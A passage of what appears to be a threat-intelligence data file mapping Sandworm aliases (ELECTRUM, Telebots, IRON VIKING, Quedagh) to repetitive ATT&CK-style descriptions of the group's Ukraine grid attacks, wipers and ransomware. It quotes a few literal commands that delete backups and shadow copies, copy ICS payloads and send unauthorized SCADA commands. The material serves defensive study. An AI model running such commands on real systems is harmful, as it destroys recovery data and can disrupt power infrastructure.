Team creates credential capture webpages to compromise existing, legitimate social media accounts., During the 2016 Ukraine Electric Power Attack, Sandworm Team used a trojanized version of Windows Notepad to add a layer of persistence for Industroyer., Sandworm Team compromised legitimate Linux servers running the EXIM mail transfer agent for use in subsequent campaigns., Sandworm Team has used a large-scale botnet to target Small Office/Home Office (SOHO) network devices., During the 2015 Ukraine Electric Power Attack, Sandworm Team created privileged domain accounts to be used for further exploitation and lateral movement. During the 2016 Ukraine Electric Power Attack, Sandworm Team created two new accounts, 'admin' and 'система' (System). The accounts were then assigned to a domain matching local operation and were delegated new privileges., During the 2016 Ukraine Electric Power Attack, Sandworm Team created two new accounts, 'admin' and 'система' (System). The accounts were then assigned to a domain matching local operation and were delegated new privileges., During the 2022 Ukraine Electric Power Attack, Sandworm Team configured Systemd to maintain persistence of GOGETTER, specifying the WantedBy=multi-user.target configuration to run GOGETTER when the system begins accepting user logins., During the 2016 Ukraine Electric Power Attack, Sandworm Team used an arbitrary system service to load at system boot for persistence for Industroyer. They also replaced the ImagePath registry value of a Windows service with a new backdoor binary. , Sandworm Team's CredRaptor tool can collect saved passwords from various internet browsers., Sandworm Team has used CaddyWiper, SDelete, and the BlackEnergy KillDisk component to overwrite files on victim systems.  Additionally, Sandworm Team has used the JUNKMAIL tool to overwrite files with null bytes.During the 2022 Ukraine Electric Power Attack, Sandworm Team deployed CaddyWiper on the victim’s IT environment systems to wipe files related to the OT capabilities, along with mapped drives, and physical drive partitions., During the 2022 Ukraine Electric Power Attack, Sandworm Team deployed CaddyWiper on the victim’s IT environment systems to wipe files related to the OT capabilities, along with mapped drives, and physical drive partitions., Sandworm Team's BCS-server tool uses base64 encoding and HTML tags for the communication traffic between the C2 server. , Sandworm Team has used Prestige ransomware to encrypt data at targeted organizations in transportation and related logistics industries in Ukraine and Poland., Sandworm Team exfiltrates data of interest from enterprise databases using Adminer., Sandworm Team has exfiltrated internal documents, files, and other data from compromised hosts., Sandworm Team defaced approximately 15,000 websites belonging to Georgian government, non-government, and private sector organizations in 2019., Sandworm Team's VBS backdoor can decode Base64-encoded data and save it to the %TEMP% folder. The group also decrypted received information using the Triple DES algorithm and decompresses it using GZip., Sandworm Team has developed malware for its operations, including malicious mobile applications and destructive malware such as NotPetya and Olympic Destroyer., Sandworm Team has used the BlackEnergy KillDisk component to corrupt the infected system's master boot record., During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Group Policy Objects (GPOs) to deploy and execute malware., Sandworm Team temporarily disrupted service to Georgian government, non-government, and private sector websites after compromising a Georgian web hosting provider in 2019., Sandworm Team has established social media accounts to disseminate victim internal-only documents and other sensitive data., Sandworm Team has created email accounts that mimic legitimate organizations for its spearphishing operations., Sandworm Team has sent system information to its C2 server using HTTP. , Sandworm Team exploits public-facing applications for initial access and to acquire infrastructure, such as exploitation of the EXIM mail transfer agent in Linux systems., Sandworm Team has exploited vulnerabilities in Microsoft PowerPoint via OLE objects (CVE-2014-4114) and Microsoft Word via crafted TIFF images (CVE-2013-3906)., Sandworm Team has used Dropbear SSH with a hardcoded backdoor password to maintain persistence within the target network. Sandworm Team has also used VPN tunnels established in legitimate software company infrastructure to gain access to internal networks of that software company's users.During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a modified Dropbear SSH client as the backdoor to target systems. , During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a modified Dropbear SSH client as the backdoor to target systems. , Sandworm Team has enumerated files on a compromised host., Sandworm Team has researched software code to enable supply-chain operations, most notably for the 2017 NotPetya attack. Sandworm Team also collected a list of computers using specific software as part of its targeting efforts., Sandworm Team has obtained valid emails addresses while conducting research against target organizations that were subsequently used in spearphishing campaigns., Sandworm Team's research of potential victim organizations included the identification and collection of employee information., Sandworm Team conducted technical reconnaissance of the Parliament of Georgia's official internet domain prior to its 2019 attack., In preparation for its attack against the 2018 Winter Olympics, Sandworm Team conducted online research of partner organizations listed on an official PyeongChang Olympics partnership site., During the 2015 Ukraine Electric Power Attack, Sandworm Team modified in-registry internet settings to lower internet security. , During the 2016 Ukraine Electric Power Attack, Sandworm Team disabled event logging on compromised systems., Sandworm Team has used backdoors that can delete files used in an attack from an infected system. During the 2015 Ukraine Electric Power Attack, vba_macro.exe deletes itself after FONTCACHE.DAT, rundll32.exe, and the associated .lnk file is delivered. , During the 2015 Ukraine Electric Power Attack, vba_macro.exe deletes itself after FONTCACHE.DAT, rundll32.exe, and the associated .lnk file is delivered. , Sandworm Team has pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data.During the 2015 Ukraine Electric Power Attack, Sandworm Team pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data. , During the 2015 Ukraine Electric Power Attack, Sandworm Team pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data. , Sandworm Team uses Prestige to delete the backup catalog from the target system using: C:/Windows/System32/wbadmin.exe delete catalog -quiet and to delete volume shadow copies using: C:/Windows/System32/vssadmin.exe delete shadows /all /quiet.  , Sandworm Team has used a keylogger to capture keystrokes by using the SetWindowsHookEx function. During the 2015 Ukraine Electric Power Attack, Sandworm Team gathered account credentials via a BlackEnergy keylogger plugin. , During the 2015 Ukraine Electric Power Attack, Sandworm Team gathered account credentials via a BlackEnergy keylogger plugin. , Sandworm Team has used move to transfer files to a network share and has copied payloads--such as Prestige ransomware--to an Active Directory Domain Controller and distributed via the Default Domain Group Policy Object. Additionally, Sandworm Team has transferred an ISO file into the OT network to gain initial access.During the 2015 Ukraine Electric Power Attack, Sandworm Team moved their tools laterally within the corporate network and between the ICS and corporate network. During the 2016 Ukraine Electric Power Attack, Sandworm Team used move to transfer files to a network share.During the 2022 Ukraine Electric Power Attack, Sandworm Team used a Group Policy Object (GPO) to copy CaddyWiper's executable msserver.exe from a staging server to a local hard drive before deployment., During the 2015 Ukraine Electric Power Attack, Sandworm Team moved their tools laterally within the corporate network and between the ICS and corporate network. , During the 2016 Ukraine Electric Power Attack, Sandworm Team used move to transfer files to a network share., During the 2022 Ukraine Electric Power Attack, Sandworm Team used a Group Policy Object (GPO) to copy CaddyWiper's executable msserver.exe from a staging server to a local hard drive before deployment., Sandworm Team masqueraded malicious installers as Windows update packages to evade defense and entice users to execute binaries., During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Systemd service units to masquerade GOGETTER malware as legitimate or seemingly legitimate services., Sandworm Team has avoided detection by naming a malicious binary explorer.exe.During the 2016 Ukraine Electric Power Attack, DLLs and EXEs with filenames associated with common electric power sector protocols were used to masquerade files., During the 2016 Ukraine Electric Power Attack, DLLs and EXEs with filenames associated with common electric power sector protocols were used to masquerade files., During the 2016 Ukraine Electric Power Attack, Sandworm Team masqueraded executables as .txt files., During the 2016 Ukraine Electric Power Attack, Sandworm Team created two new accounts, 'admin' and 'система' (System)., During the 2015 Ukraine Electric Power Attack, Sandworm Team modified in-registry Internet settings to lower internet security before launching rundll32.exe, which in-turn launches the malware and communicates with C2 servers over the Internet. ., Sandworm Team uses Prestige to disable and restore file system redirection by using the following functions:  Wow64DisableWow64FsRedirection() and Wow64RevertWow64FsRedirection()., Sandworm Team has used intercepter-NG to sniff passwords in network traffic. During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy’s network sniffer module to discover user credentials being sent over the network between the local LAN and the power grid’s industrial control systems. , During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy’s network sniffer module to discover user credentials being sent over the network between the local LAN and the power grid’s industrial control systems. , During the 2022 Ukraine Electric Power Attack, Sandworm Team proxied C2 communications within a TLS-based tunnel., Sandworm Team has used port 6789 to accept connections on the group's SSH server., Sandworm Team has used Base64 encoding within malware variants.During the 2016 Ukraine Electric Power Attack, Sandworm Team used heavily obfuscated code with Industroyer in its Windows Notepad backdoor., During the 2016 Ukraine Electric Power Attack, Sandworm Team used heavily obfuscated code with Industroyer in its Windows Notepad backdoor., During the 2016 Ukraine Electric Power Attack, Sandworm Team used UPX to pack a copy of Mimikatz., Sandworm Team has used ROT13 encoding, AES encryption and compression with the zlib library for their Python-based backdoor., Sandworm Team has acquired open-source tools for their operations, including Invoke-PSImage, which was used to establish an encrypted channel from a compromised host to Sandworm Team's C2 server in preparation for the 2018 Winter Olympics attack, as well as Impacket and RemoteExec, which were used in their 2022 Prestige operations. Additionally, Sandworm Team has used Empire, Cobalt Strike and PoshC2., In 2017, Sandworm Team conducted technical research related to vulnerabilities associated with websites used by the Korean Sport and Olympic Committee, a Korean power company, and a Korean airport., Sandworm Team has used its plainpwd tool, a modified version of Mimikatz, and comsvcs.dll to dump Windows credentials from system memory. During the 2016 Ukraine Electric Power Attack, Sandworm Team used Mimikatz to capture and use legitimate credentials., During the 2016 Ukraine Electric Power Attack, Sandworm Team used Mimikatz to capture and use legitimate credentials., Sandworm Team has used ntdsutil.exe to back up the Active Directory database, likely for credential access., Sandworm Team has delivered malicious Microsoft Office and ZIP file attachments via spearphishing emails.During the 2015 Ukraine Electric Power Attack, Sandworm Team obtained their initial foothold into many IT systems using Microsoft Office attachments delivered through phishing emails. , During the 2015 Ukraine Electric Power Attack, Sandworm Team obtained their initial foothold into many IT systems using Microsoft Office attachments delivered through phishing emails. , Sandworm Team has crafted phishing emails containing malicious hyperlinks., Sandworm Team has crafted spearphishing emails with hyperlinks designed to trick unwitting recipients into revealing their account credentials., During the 2015 Ukraine Electric Power Attack, Sandworm Team loaded BlackEnergy into svchost.exe, which then launched iexplore.exe for their C2. , During the 2022 Ukraine Electric Power Attack, Sandworm Team deployed the GOGETTER tunneler software to establish a 'Yamux' TLS-based C2 channel with an external server(s)., Sandworm Team's BCS-server tool can create an internal proxy server to redirect traffic from the adversary-controlled C2 to internal servers which may not be connected to the internet, but are interconnected locally. , Sandworm Team has used remote administration tools or remote industrial control system client software for execution and to maliciously release electricity breakers., Sandworm Team has copied payloads to the ADMIN$ share of remote systems and run net use to connect to network shares.During the 2016 Ukraine Electric Power Attack, Sandworm Team utilized net use to connect to network shares., During the 2016 Ukraine Electric Power Attack, Sandworm Team utilized net use to connect to network shares., Sandworm Team has used a tool to query Active Directory using LDAP, discovering information about computers listed in AD. During the 2015 Ukraine Electric Power Attack, Sandworm Team remotely discovered systems over LAN connections. OT systems were visible from the IT network   as well, giving adversaries the ability to discover operational assets. During the 2016 Ukraine Electric Power Attack, Sandworm Team checked for connectivity to resources within the network and used LDAP to query Active Directory, discovering information about computers listed in AD., During the 2015 Ukraine Electric Power Attack, Sandworm Team remotely discovered systems over LAN connections. OT systems were visible from the IT network   as well, giving adversaries the ability to discover operational assets. , During the 2016 Ukraine Electric Power Attack, Sandworm Team checked for connectivity to resources within the network and used LDAP to query Active Directory, discovering information about computers listed in AD., Sandworm Team leveraged SHARPIVORY, a .NET dropper that writes embedded payload to disk and uses scheduled tasks to persist on victim machines.During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Scheduled Tasks through a Group Policy Object (GPO) to execute CaddyWiper at a predetermined time., During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Scheduled Tasks through a Group Policy Object (GPO) to execute CaddyWiper at a predetermined time., Sandworm Team researched Ukraine's unique legal entity identifier (called an 'EDRPOU' number), including running queries on the EDRPOU website, in preparation for the NotPetya attack. Sandworm Team has also researched third-party websites to help it craft credible spearphishing emails., Sandworm Team has conducted research against potential victim websites as part of its operational planning., During the 2016 Ukraine Electric Power Attack, Sandworm Team used various MS-SQL stored procedures., Sandworm Team has used webshells including P.A.S. Webshell to maintain access to victim networks.During the 2022 Ukraine Electric Power Attack, Sandworm Team deployed the Neo-REGEORG webshell on an internet-facing server., During the 2022 Ukraine Electric Power Attack, Sandworm Team deployed the Neo-REGEORG webshell on an internet-facing server., Sandworm Team attempts to stop the MSSQL Windows service to ensure successful encryption of locked files. , Sandworm Team has used the commercially available tool RemoteExec for agentless remote code execution., Sandworm Team staged compromised versions of legitimate software installers in forums to enable initial access to executing user., Sandworm Team used information stealer malware to collect browser session cookies., Sandworm Team staged compromised versions of legitimate software installers on forums to achieve initial, untargetetd access in victim environments. , Sandworm Team has distributed NotPetya by compromising the legitimate Ukrainian accounting software M.E.Doc and replacing a legitimate software update with a malicious one., Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe. During the 2015 Ukraine Electric Power Attack, Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe. , During the 2015 Ukraine Electric Power Attack, Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe. , Sandworm Team used a backdoor to enumerate information about the infected system's operating system. , Sandworm Team had gathered user, IP address, and server data related to RDP sessions on a compromised host. It has also accessed network diagram files useful for understanding how a host's network was configured. , Sandworm Team has collected the username from a compromised host., Sandworm Team has used dedicated network connections from one victim organization to gain unauthorized access to a separate organization. Additionally, Sandworm Team has accessed Internet service providers and telecommunication entities that provide mobile connectivity. , Sandworm Team has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders., Sandworm Team has tricked unwitting recipients into clicking on spearphishing attachments and enabling malicious macros embedded within files.During the 2015 Ukraine Electric Power Attack, Sandworm Team leveraged Microsoft Office attachments which contained malicious macros that were automatically executed once the user permitted them. , During the 2015 Ukraine Electric Power Attack, Sandworm Team leveraged Microsoft Office attachments which contained malicious macros that were automatically executed once the user permitted them. , Sandworm Team have used previously acquired legitimate credentials prior to attacks.During the 2015 Ukraine Electric Power Attack, Sandworm Team used valid accounts on the corporate network to escalate privileges, move laterally, and establish persistence within the corporate network. , During the 2015 Ukraine Electric Power Attack, Sandworm Team used valid accounts on the corporate network to escalate privileges, move laterally, and establish persistence within the corporate network. , Sandworm Team has used stolen credentials to access administrative accounts within the domain., Sandworm Team has used the Telegram Bot API from Telegram Messenger to send and receive commands to its Python backdoor. Sandworm Team also used legitimate M.E.Doc software update check requests for sending and receiving commands and hosted malicious payloads on putdrive.com., Sandworm Team has used Impacket’s WMIexec module for remote code execution and VBScript to run WMI queries.During the 2016 Ukraine Electric Power Attack, WMI in scripts were used for remote execution and system surveys. , During the 2016 Ukraine Electric Power Attack, WMI in scripts were used for remote execution and system surveys. , Sandworm Team used SMS-based phishing to target victims with malicious links., Sandworm Team can collect encrypted Telegram and Signal communications., During the 2022 Ukraine Electric Power Attack, Sandworm Team used existing hypervisor access to map an ISO image named a.iso to a virtual machine running a SCADA server. The SCADA server’s operating system was configured to autorun CD-ROM images, and as a result, a malicious VBS script on the ISO image was automatically executed., During the 2015 Ukraine Electric Power Attack, Sandworm Team blocked command messages by using malicious firmware to render serial-to-ethernet converters inoperable. , During the 2015 Ukraine Electric Power Attack, Sandworm Team blocked reporting messages by using malicious firmware to render serial-to-ethernet converters inoperable. , During the 2015 Ukraine Electric Power Attack, Sandworm Team overwrote the serial-to-ethernet converter firmware, rendering the devices not operational. This meant that communication to the downstream serial devices was either not possible or more difficult. , Sandworm Team uses the MS-SQL server xp_cmdshell command, and PowerShell to execute commands. During the 2016 Ukraine Electric Power Attack, Sandworm Team supplied the name of the payload DLL to Industroyer via a command line parameter.During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged the SCIL-API on the MicroSCADA platform to execute commands through the scilc.exe binary., During the 2016 Ukraine Electric Power Attack, Sandworm Team supplied the name of the payload DLL to Industroyer via a command line parameter., During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged the SCIL-API on the MicroSCADA platform to execute commands through the scilc.exe binary., During the 2015 Ukraine Electric Power Attack, Sandworm Team used port 443 to communicate with their C2 servers. , Sandworm Team establishes an internal proxy prior to the installation of backdoors within the network. During the 2015 Ukraine Electric Power Attack, Sandworm Team established an internal proxy prior to the installation of backdoors within the network. , During the 2015 Ukraine Electric Power Attack, Sandworm Team established an internal proxy prior to the installation of backdoors within the network. , During the 2015 Ukraine Electric Power Attack, KillDisk rendered devices that were necessary for remote recovery unusable, including at least one RTU. Additionally, Sandworm Team overwrote the firmware for serial-to-ethernet converters, denying operators control of the downstream devices. , During the 2015 Ukraine Electric Power Attack, power company phone line operators were hit with a denial of service attack so that they couldn’t field customers’ calls about outages. Operators were also denied service to their downstream devices when their serial-to-ethernet converters had their firmware overwritten, which bricked the devices. , During the 2015 Ukraine Electric Power Attack, Sandworm Team scheduled the uninterruptable power supplies (UPS) to shutdown data and telephone servers via the UPS management interface. , Sandworm Team actors exploited vulnerabilities in GE's Cimplicity HMI and Advantech/Broadwin WebAccess HMI software which had been directly exposed to the internet.  , During the 2015 Ukraine Electric Power Attack, Sandworm Team used Valid Accounts taken from the Windows Domain Controller to access the control system Virtual Private Network (VPN) used by grid operators. , During the 2015 Ukraine Electric Power Attack, Sandworm Team utilized HMI GUIs in the SCADA environment to open breakers. , During the 2015 Ukraine Electric Power Attack, Sandworm Team moved their tools laterally within the ICS network. During the 2016 Ukraine Electric Power Attack, Sandworm Team used a VBS script to facilitate lateral tool transfer. The VBS script was used to copy ICS-specific payloads with the following command: cscript C:/Backinfo/ufn.vbs C:/Backinfo/101.dll C:/Delta/101.dll, During the 2016 Ukraine Electric Power Attack, Sandworm Team used a VBS script to facilitate lateral tool transfer. The VBS script was used to copy ICS-specific payloads with the following command: cscript C:/Backinfo/ufn.vbs C:/Backinfo/101.dll C:/Delta/101.dll, During the 2015 Ukraine Electric Power Attack, Sandworm Team opened the breakers at the infected sites, shutting the power off for thousands of businesses and households for around 6 hours. , During the 2015 Ukraine Electric Power Attack, operators were shut out of their equipment either through the denial of peripheral use or the degradation of equipment. Operators were therefore unable to recover from the incident through their traditional means. Much of the power was restored manually. , During the 2015 Ukraine Electric Power Attack, power breakers were opened which caused the operating companies to be unable to deliver power, and left thousands of businesses and households without power for around 6 hours. , During the 2015 Ukraine Electric Power Attack, Sandworm Team opened live breakers via remote commands to the HMI, causing blackouts. , During the 2016 Ukraine Electric Power Attack, Sandworm Team transferred executable files as .txt and then renamed them to .exe, likely to avoid detection through extension tracking., During the 2015 Ukraine Electric Power Attack, Sandworm Team used an IT helpdesk software to move the mouse on ICS control devices to maliciously release electricity breakers. During the 2016 Ukraine Electric Power Attack, Sandworm Team used MS-SQL access to a pivot machine, allowing code execution throughout the ICS network., During the 2016 Ukraine Electric Power Attack, Sandworm Team used MS-SQL access to a pivot machine, allowing code execution throughout the ICS network., During the 2015 Ukraine Electric Power Attack, Sandworm Team remotely discovered operational assets once on the OT network.  , During the 2016 Ukraine Electric Power Attack, Sandworm Team utilized VBS and batch scripts for file movement and as wrappers for PowerShell execution.During the 2022 Ukraine Electric Power Attack, Sandworm Team utilizes a Visual Basic script lun.vbs to execute n.bat which then executed the MicroSCADA scilc.exe command., During the 2022 Ukraine Electric Power Attack, Sandworm Team utilizes a Visual Basic script lun.vbs to execute n.bat which then executed the MicroSCADA scilc.exe command., During the 2022 Ukraine Electric Power Attack, Sandworm Team executed a MicroSCADA application binary scilc.exe to send a predefined list of SCADA instructions specified in a file defined by the adversary, s1.txt. The executed command C:/sc/prog/exec/scilc.exe -do pack/scil/s1.txt leverages the SCADA software to send unauthorized command messages to remote substations., During the 2015 Ukraine Electric Power Attack, Sandworm Team overwrote the serial-to-ethernet gateways with custom firmware to make systems either disabled, shutdown, and/or unrecoverable. , During the 2015 Ukraine Electric Power Attack, Sandworm Team issued unauthorized commands to substation breaks after gaining control of operator workstations and accessing a distribution management system (DMS) application. During the 2022 Ukraine Electric Power Attack, Sandworm Team used the MicroSCADA SCIL-API to specify a set of SCADA instructions, including the sending of unauthorized commands to substation devices., During the 2022 Ukraine Electric Power Attack, Sandworm Team used the MicroSCADA SCIL-API to specify a set of SCADA instructions, including the sending of unauthorized commands to substation devices., During the 2015 Ukraine Electric Power Attack, Sandworm Team used valid accounts to laterally move through VPN connections and dual-homed systems. Sandworm Team used the credentials of valid accounts to interact with client applications and access employee workstations hosting HMI applications.  During the 2016 Ukraine Electric Power Attack, Sandworm Team used valid accounts to laterally move through VPN connections and dual-homed systems., During the 2016 Ukraine Electric Power Attack, Sandworm Team used valid accounts to laterally move through VPN connections and dual-homed systems.",
    "ELECTRUM": "Sandworm Team has used a tool to query Active Directory using LDAP, discovering information about usernames listed in AD. , Sandworm Team used malware to enumerate email settings, including usernames and passwords, from the M.E.Doc application. , During the 2016 Ukraine Electric Power Attack, Sandworm Team used the sp_addlinkedsrvlogin command in MS-SQL to create a link between a created account and other servers in the network., Sandworm Team used various third-party email campaign management services to deliver phishing emails., Sandworm Team has registered domain names and created URLs that are often designed to mimic or spoof legitimate websites, such as email login pages, online file sharing and storage websites, and password reset pages, while also hosting these items on legitimate, compromised network infrastructure., Sandworm Team has leased servers from resellers instead of leasing infrastructure directly from hosting companies to enable its operations., Sandworm Team has scanned network infrastructure for vulnerabilities as part of its operational planning., Sandworm Team's BCS-server tool connects to the designated C2 server via HTTP. During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy to communicate between compromised hosts and their command-and-control servers via HTTP post requests. , During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy to communicate between compromised hosts and their command-and-control servers via HTTP post requests. , During the 2016 Ukraine Electric Power Attack, Sandworm Team used a script to attempt RPC authentication against a number of hosts., Sandworm Team has used PowerShell scripts to run a credential harvesting tool in memory to evade defenses. During the 2016 Ukraine Electric Power Attack, Sandworm Team used PowerShell scripts to run a credential harvesting tool in memory to evade defenses.During the 2022 Ukraine Electric Power Attack, Sandworm Team utilized a PowerShell utility called TANKTRAP to spread and launch a wiper using Windows Group Policy., During the 2016 Ukraine Electric Power Attack, Sandworm Team used PowerShell scripts to run a credential harvesting tool in memory to evade defenses., During the 2022 Ukraine Electric Power Attack, Sandworm Team utilized a PowerShell utility called TANKTRAP to spread and launch a wiper using Windows Group Policy., During the 2016 Ukraine Electric Power Attack, Sandworm Team used the xp_cmdshell command in MS-SQL., Sandworm Team has created VBScripts to run an SSH server. During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a VBA script called vba_macro.exe. This macro dropped FONTCACHE.DAT, the primary BlackEnergy implant; rundll32.exe, for executing the malware; NTUSER.log, an empty file; and desktop.ini, the default file used to determine folder displays on Windows machines. During the 2016 Ukraine Electric Power Attack, Sandworm Team created VBScripts to run on an SSH server.",
    "Telebots": "During the 2022 Ukraine Electric Power Attack, Sandworm Team utilized a PowerShell utility called TANKTRAP to spread and launch a wiper using Windows Group Policy., During the 2016 Ukraine Electric Power Attack, Sandworm Team used PowerShell scripts to run a credential harvesting tool in memory to evade defenses., During the 2022 Ukraine Electric Power Attack, Sandworm Team utilized a PowerShell utility called TANKTRAP to spread and launch a wiper using Windows Group Policy., During the 2016 Ukraine Electric Power Attack, Sandworm Team used the xp_cmdshell command in MS-SQL., Sandworm Team has created VBScripts to run an SSH server. During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a VBA script called vba_macro.exe. This macro dropped FONTCACHE.DAT, the primary BlackEnergy implant; rundll32.exe, for executing the malware; NTUSER.log, an empty file; and desktop.ini, the default file used to determine folder displays on Windows machines. During the 2016 Ukraine Electric Power Attack, Sandworm Team created VBScripts to run on an SSH server., During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a VBA script called vba_macro.exe. This macro dropped FONTCACHE.DAT, the primary BlackEnergy implant; rundll32.exe, for executing the malware; NTUSER.log, an empty file; and desktop.ini, the default file used to determine folder displays on Windows machines. , During the 2016 Ukraine Electric Power Attack, Sandworm Team created VBScripts to run on an SSH server., Sandworm Team creates credential capture webpages to compromise existing, legitimate social media accounts., During the 2016 Ukraine Electric Power Attack, Sandworm Team used a trojanized version of Windows Notepad to add a layer of persistence for Industroyer., Sandworm Team compromised legitimate Linux servers running the EXIM mail transfer agent for use in subsequent campaigns., Sandworm Team has used a large-scale botnet to target Small Office/Home Office (SOHO) network devices., During the 2015 Ukraine Electric Power Attack, Sandworm Team created privileged domain accounts to be used for further exploitation and lateral movement",
    "IRON VIKING": "During the 2016 Ukraine Electric Power Attack, Sandworm Team created two new accounts, 'admin' and 'система' (System). The accounts were then assigned to a domain matching local operation and were delegated new privileges., During the 2016 Ukraine Electric Power Attack, Sandworm Team created two new accounts, 'admin' and 'система' (System). The accounts were then assigned to a domain matching local operation and were delegated new privileges., During the 2022 Ukraine Electric Power Attack, Sandworm Team configured Systemd to maintain persistence of GOGETTER, specifying the WantedBy=multi-user.target configuration to run GOGETTER when the system begins accepting user logins., During the 2016 Ukraine Electric Power Attack, Sandworm Team used an arbitrary system service to load at system boot for persistence for Industroyer. They also replaced the ImagePath registry value of a Windows service with a new backdoor binary. , Sandworm Team's CredRaptor tool can collect saved passwords from various internet browsers., Sandworm Team has used CaddyWiper, SDelete, and the BlackEnergy KillDisk component to overwrite files on victim systems.  Additionally, Sandworm Team has used the JUNKMAIL tool to overwrite files with null bytes.During the 2022 Ukraine Electric Power Attack, Sandworm Team deployed CaddyWiper on the victim’s IT environment systems to wipe files related to the OT capabilities, along with mapped drives, and physical drive partitions., During the 2022 Ukraine Electric Power Attack, Sandworm Team deployed CaddyWiper on the victim’s IT environment systems to wipe files related to the OT capabilities, along with mapped drives, and physical drive partitions., Sandworm Team's BCS-server tool uses base64 encoding and HTML tags for the communication traffic between the C2 server. , Sandworm Team has used Prestige ransomware to encrypt data at targeted organizations in transportation and related logistics industries in Ukraine and Poland., Sandworm Team exfiltrates data of interest from enterprise databases using Adminer., Sandworm Team has exfiltrated internal documents, files, and other data from compromised hosts., Sandworm Team defaced approximately 15,000 websites belonging to Georgian government, non-government, and private sector organizations in 2019., Sandworm Team's VBS backdoor can decode Base64-encoded data and save it to the %TEMP% folder. The group also decrypted received information using the Triple DES algorithm and decompresses it using GZip., Sandworm Team has developed malware for its operations, including malicious mobile applications and destructive malware such as NotPetya and Olympic Destroyer., Sandworm Team has used the BlackEnergy KillDisk component to corrupt the infected system's master boot record., During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Group Policy Objects (GPOs) to deploy and execute malware., Sandworm Team temporarily disrupted service to Georgian government, non-government, and private sector websites after compromising a Georgian web hosting provider in 2019., Sandworm Team has established social media accounts to disseminate victim internal-only documents and other sensitive data., Sandworm Team has created email accounts that mimic legitimate organizations for its spearphishing operations., Sandworm Team has sent system information to its C2 server using HTTP. , Sandworm Team exploits public-facing applications for initial access and to acquire infrastructure, such as exploitation of the EXIM mail transfer agent in Linux systems., Sandworm Team has exploited vulnerabilities in Microsoft PowerPoint via OLE objects (CVE-2014-4114) and Microsoft Word via crafted TIFF images (CVE-2013-3906)., Sandworm Team has used Dropbear SSH with a hardcoded backdoor password to maintain persistence within the target network. Sandworm Team has also used VPN tunnels established in legitimate software company infrastructure to gain access to internal networks of that software company's users.During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a modified Dropbear SSH client as the backdoor to target systems. , During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a modified Dropbear SSH client as the backdoor to target systems. , Sandworm Team has enumerated files on a compromised host.",
    "Quedagh": "Sandworm Team has developed malware for its operations, including malicious mobile applications and destructive malware such as NotPetya and Olympic Destroyer., Sandworm Team has used the BlackEnergy KillDisk component to corrupt the infected system's master boot record., During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Group Policy Objects (GPOs) to deploy and execute malware., Sandworm Team temporarily disrupted service to Georgian government, non-government, and private sector websites after compromising a Georgian web hosting provider in 2019., Sandworm Team has established social media accounts to disseminate victim internal-only documents and other sensitive data., Sandworm Team has created email accounts that mimic legitimate organizations for its spearphishing operations., Sandworm Team has sent system information to its C2 server using HTTP. , Sandworm Team exploits public-facing applications for initial access and to acquire infrastructure, such as exploitation of the EXIM mail transfer agent in Linux systems., Sandworm Team has exploited vulnerabilities in Microsoft PowerPoint via OLE objects (CVE-2014-4114) and Microsoft Word via crafted TIFF images (CVE-2013-3906)., Sandworm Team has used Dropbear SSH with a hardcoded backdoor password to maintain persistence within the target network. Sandworm Team has also used VPN tunnels established in legitimate software company infrastructure to gain access to internal networks of that software company's users.During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a modified Dropbear SSH client as the backdoor to target systems. , During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a modified Dropbear SSH client as the backdoor to target systems. , Sandworm Team has enumerated files on a compromised host., Sandworm Team has researched software code to enable supply-chain operations, most notably for the 2017 NotPetya attack. Sandworm Team also collected a list of computers using specific software as part of its targeting efforts., Sandworm Team has obtained valid emails addresses while conducting research against target organizations that were subsequently used in spearphishing campaigns., Sandworm Team's research of potential victim organizations included the identification and collection of employee information., Sandworm Team conducted technical reconnaissance of the Parliament of Georgia's official internet domain prior to its 2019 attack., In preparation for its attack against the 2018 Winter Olympics, Sandworm Team conducted online research of partner organizations listed on an official PyeongChang Olympics partnership site., During the 2015 Ukraine Electric Power Attack, Sandworm Team modified in-registry internet settings to lower internet security. , During the 2016 Ukraine Electric Power Attack, Sandworm Team disabled event logging on compromised systems., Sandworm Team has used backdoors that can delete files used in an attack from an infected system. During the 2015 Ukraine Electric Power Attack, vba_macro.exe deletes itself after FONTCACHE.DAT, rundll32.exe, and the associated .lnk file is delivered. , During the 2015 Ukraine Electric Power Attack, vba_macro.exe deletes itself after FONTCACHE.DAT, rundll32.exe, and the associated .lnk file is delivered. , Sandworm Team has pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data.During the 2015 Ukraine Electric Power Attack, Sandworm Team pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data. , During the 2015 Ukraine Electric Power Attack, Sandworm Team pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data. , Sandworm Team uses Prestige to delete the backup catalog from the target system using: C:/Windows/System32/wbadmin.exe delete catalog -quiet and to delete volume shadow copies using: C:/Windows/System32/vssadmin.exe delete shadows /all /quiet.  , Sandworm Team has used a keylogger to capture keystrokes by using the SetWindowsHookEx function. During the 2015 Ukraine Electric Power Attack, Sandworm Team gathered account credentials via a BlackEnergy keylogger plugin. , During the 2015 Ukraine 